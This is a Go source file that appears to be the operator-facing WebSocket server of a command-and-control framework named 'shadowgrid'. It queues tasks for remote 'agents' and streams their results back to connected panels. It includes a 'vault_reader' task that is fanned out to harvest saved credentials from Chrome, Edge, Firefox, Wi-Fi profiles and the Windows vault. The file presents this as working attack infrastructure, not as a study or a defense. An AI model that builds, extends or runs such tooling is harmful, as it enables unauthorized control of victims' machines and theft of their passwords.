package interact

import (
	"encoding/json"
	"log"
	"net/http"
	"sync"

	"github.com/golang-jwt/jwt/v5"
	"github.com/gorilla/websocket"

	"shadowgrid/database"
	"shadowgrid/models"
)

type InteractServer struct {
	// Map of agent_id -> list of connected panel WebSockets
	panels    map[string][]*websocket.Conn
	mu        sync.Mutex
	DB        *database.DB
	JWTSecret string
}

func New(db *database.DB, jwtSecret string) *InteractServer {
	return &InteractServer{
		panels:    make(map[string][]*websocket.Conn),
		DB:        db,
		JWTSecret: jwtSecret,
	}
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// validateToken checks the JWT token from query param
func (s *InteractServer) validateToken(tokenStr string) bool {
	if tokenStr == "" {
		return false
	}
	token, err := jwt.Parse(tokenStr, func(t *jwt.Token) (interface{}, error) {
		return []byte(s.JWTSecret), nil
	})
	return err == nil && token.Valid
}

// HandlePanel - Panel connects here for interactive session
func (s *InteractServer) HandlePanel(w http.ResponseWriter, r *http.Request) {
	// Auth from query param (WebSocket can't send headers)
	token := r.URL.Query().Get("token")
	if !s.validateToken(token) {
		http.Error(w, "unauthorized", 401)
		return
	}

	agentID := r.URL.Query().Get("agent_id")
	if agentID == "" {
		http.Error(w, "missing agent_id", 400)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[INTERACT] WebSocket upgrade failed: %v", err)
		return
	}

	// Register this panel connection
	s.mu.Lock()
	s.panels[agentID] = append(s.panels[agentID], conn)
	s.mu.Unlock()

	shortID := agentID
	if len(shortID) > 8 {
		shortID = shortID[:8]
	}
	log.Printf("[INTERACT] Panel connected for agent %s", shortID)

	// Send initial connected message
	conn.WriteJSON(map[string]interface{}{
		"type":     "connected",
		"agent_id": agentID,
	})

	// Read commands from panel
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var cmd struct {
			Type string          `json:"type"`
			Args json.RawMessage `json:"args"`
		}
		if json.Unmarshal(msg, &cmd) != nil {
			continue
		}

		// Handle ping/keepalive
		if cmd.Type == "ping" {
			conn.WriteJSON(map[string]interface{}{
				"type": "pong",
			})
			continue
		}

		argsStr := "{}"
		if cmd.Args != nil {
			argsStr = string(cmd.Args)
		}

		// Auto-split vault_reader into per-source tasks
		if cmd.Type == "vault_reader" {
			var parsedArgs map[string]interface{}
			if cmd.Args != nil {
				_ = json.Unmarshal(cmd.Args, &parsedArgs)
			}
			if parsedArgs == nil {
				parsedArgs = map[string]interface{}{}
			}
			source, _ := parsedArgs["source"].(string)
			if source == "" || source == "all" {
				sources := []string{"chrome", "edge", "firefox", "wifi", "vault"}
				var firstID int64
				for i, src := range sources {
					splitArgs, _ := json.Marshal(map[string]string{"source": src})
					task := &models.Task{
						AgentID:   agentID,
						TaskType:  "vault_reader",
						ArgsJSON:  string(splitArgs),
						CreatedBy: "interact",
					}
					id, err := s.DB.CreateTask(task)
					if err != nil {
						conn.WriteJSON(map[string]interface{}{
							"type":  "error",
							"error": err.Error(),
						})
						break
					}
					if i == 0 {
						firstID = id
					}
				}
				conn.WriteJSON(map[string]interface{}{
					"type":      "task_created",
					"task_id":   firstID,
					"task_type": "vault_reader",
					"split":     5,
				})
				continue
			}
		}

		// Create task in DB (same as REST API)
		task := &models.Task{
			AgentID:   agentID,
			TaskType:  cmd.Type,
			ArgsJSON:  argsStr,
			CreatedBy: "interact",
		}
		taskID, err := s.DB.CreateTask(task)
		if err != nil {
			conn.WriteJSON(map[string]interface{}{
				"type":  "error",
				"error": err.Error(),
			})
			continue
		}

		// Acknowledge task creation
		conn.WriteJSON(map[string]interface{}{
			"type":      "task_created",
			"task_id":   taskID,
			"task_type": cmd.Type,
		})
	}

	// Cleanup on disconnect
	s.mu.Lock()
	conns := s.panels[agentID]
	for i, c := range conns {
		if c == conn {
			s.panels[agentID] = append(conns[:i], conns[i+1:]...)
			break
		}
	}
	if len(s.panels[agentID]) == 0 {
		delete(s.panels, agentID)
	}
	s.mu.Unlock()
	conn.Close()
	log.Printf("[INTERACT] Panel disconnected for agent %s", shortID)
}

// PushResult - Called by the sync handler when agent returns a result.
// Pushes the result to all connected panel WebSockets for that agent.
func (s *InteractServer) PushResult(agentID string, taskID int, taskType string, output string) {
	s.mu.Lock()
	conns := make([]*websocket.Conn, len(s.panels[agentID]))
	copy(conns, s.panels[agentID])
	s.mu.Unlock()

	if len(conns) == 0 {
		return
	}

	msg := map[string]interface{}{
		"type":      "result",
		"task_id":   taskID,
		"task_type": taskType,
		"output":    output,
	}

	for _, conn := range conns {
		if err := conn.WriteJSON(msg); err != nil {
			log.Printf("[INTERACT] Failed to push result to panel: %v", err)
		}
	}
}

// PushAgentStatus - Push agent online/offline status changes
func (s *InteractServer) PushAgentStatus(agentID string, status string) {
	s.mu.Lock()
	conns := make([]*websocket.Conn, len(s.panels[agentID]))
	copy(conns, s.panels[agentID])
	s.mu.Unlock()

	for _, conn := range conns {
		conn.WriteJSON(map[string]interface{}{
			"type":   "agent_status",
			"status": status,
		})
	}
}

// HasPanelConnections returns true if any panel is connected for the given agent
func (s *InteractServer) HasPanelConnections(agentID string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.panels[agentID]) > 0
}

// GetConnectedAgents returns agent IDs with active panel connections
func (s *InteractServer) GetConnectedAgents() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	agents := make([]string, 0, len(s.panels))
	for id, conns := range s.panels {
		if len(conns) > 0 {
			agents = append(agents, id)
		}
	}
	return agents
}
